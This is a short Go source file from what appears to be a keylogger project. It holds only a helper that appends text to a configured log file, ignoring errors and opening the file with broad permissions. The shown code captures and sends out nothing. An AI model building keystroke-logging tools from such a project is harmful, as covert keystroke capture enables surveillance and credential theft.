package write

import (
	"os"

	"github.com/Tom5521/keylogger/internal/cfgs"
)

func Append(s string) {
	f, _ := os.ReadFile(cfgs.Settings.LogFile)
	strdata := string(f) + s
	os.WriteFile(cfgs.Settings.LogFile, []byte(strdata), os.ModePerm)
}
